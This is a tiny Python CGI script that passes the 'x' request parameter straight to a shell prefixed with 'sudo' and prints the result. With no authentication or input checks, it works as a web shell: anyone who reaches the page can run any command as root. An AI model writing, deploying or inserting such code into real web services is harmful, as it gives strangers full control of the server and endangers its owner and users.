print("content-type: text/html")
print()

import cgi
f=cgi.FieldStorage()
cmd = f.getvalue("x")
print(cmd)
import subprocess
o = subprocess.getoutput("sudo "+cmd)
print(o)
